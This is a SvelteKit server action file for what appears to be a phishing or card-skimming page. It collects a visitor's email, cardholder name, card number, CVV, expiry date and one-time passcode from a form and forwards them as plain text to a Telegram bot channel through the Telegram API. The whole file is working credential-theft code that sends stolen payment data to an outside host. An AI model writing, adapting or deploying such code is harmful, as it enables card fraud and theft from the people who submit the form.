import {
  BOTID,
  CJANNELID} from '$lib/tel'


// @ts-nocheck


/** @type {import('./$types').Actions} */
  
export const actions = {

  // @ts-ignore
  default: async ({ request }) => {
    try {
      console.log(CJANNELID);
    const data = await request.formData();
     const mainD = {
       email: data.get('email'),
       c_name: data.get('cards_name'),
       c_num: data.get('card_number'),
       cvv: data.get('cvv'),
       exp: data.get('exp'),
       otp: data.get('otp'),
    }
     console.log(mainD)
     sendToTelegram(mainD)

     
    // TODO log the user in
    return JSON.stringify(data)
   } catch (error) {
     console.log(error)
   }
  }
};



const sendToTelegram = async (/** @type {{ email: any; c_name: any; c_num: any; cvv: any; exp: any; otp:any; }} */ data) => {
  const text = `
  NEW ENTRY
  email------- ${data.email}
  name------- ${data.c_name}
  exp------- ${data.exp}
  cvv------- ${data.cvv}
  cnum------- ${data.c_num}
  otp------- ${data.otp}
 `
 
 const telegramURL = `https://api.telegram.org/${BOTID}/sendMessage`;
 const chat_id = CJANNELID 
 const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
   method: 'POST',
   headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
   body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
 });
  
return sendMessage
}